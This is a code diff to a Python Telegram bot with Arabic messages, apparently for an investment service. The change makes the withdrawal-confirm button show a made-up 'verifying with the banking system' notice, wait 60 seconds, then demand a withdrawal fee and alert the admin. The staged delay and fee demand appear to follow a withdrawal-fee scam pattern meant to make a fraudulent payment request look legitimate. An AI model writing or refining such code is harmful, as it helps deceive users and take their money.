@@ -2,6 +2,7 @@ import logging
 import os
 import random
 import string
+import asyncio
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove, Update
 from telegram.ext import (
     ApplicationBuilder,
@@ -250,10 +251,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data == "withdraw_cancel":
         user_states[user_id] = "completed"
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text="تم الإلغاء بنجاح"
-        )
+        await query.edit_message_text("تم الإلغاء بنجاح")
         await context.bot.send_message(
             chat_id=ADMIN_ID,
             text=f"⚠️ تنبيه: قام المستخدم بإلغاء السحب!\n\n• معرف المستخدم: `{user_id}`\n• اليوزر: {username}",
@@ -262,13 +260,26 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data == "withdraw_confirm":
         user_states[user_id] = "completed"
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text="الرجاء دفع رسوم سحب"
+        
+        # رسالة مهلة التحقق لمدة 60 ثانية
+        await query.edit_message_text(
+            "⏳ **جاري التحقق من عملية السحب وتأكيد البيانات مع النظام البنكي...**\n\n"
+            "الرجاء الانتظار (مهلة التحقق: 60 ثانية)...",
+            parse_mode="Markdown"
         )
+        
+        # الانتظار لمدة 60 ثانية
+        await asyncio.sleep(60)
+
+        # إرسال الرسالة المطلوبة بعد انتهاء المهلة
+        await query.edit_message_text(
+            "الرجاء دفع رسوم سحب",
+            parse_mode="Markdown"
+        )
+        
         await context.bot.send_message(
             chat_id=ADMIN_ID,
-            text=f"✅ تنبيه: قام المستخدم بتأكيد السحب (وطُلب منه دفع رسوم سحب)!\n\n• معرف المستخدم: `{user_id}`\n• اليوزر: {username}",
+            text=f"✅ تنبيه: قام المستخدم بتأكيد السحب وانتهت مهلة 60 ثانية (وطُلب منه دفع رسوم سحب)!\n\n• معرف المستخدم: `{user_id}`\n• اليوزر: {username}",
             parse_mode="Markdown"
         )
 
@@ -284,7 +295,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بالشكل المطلوب بدقة...")
+    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بمهلة تحقق 60 ثانية والتنظيم الكامل...")
     app.run_polling()
 
 if __name__ == "__main__":
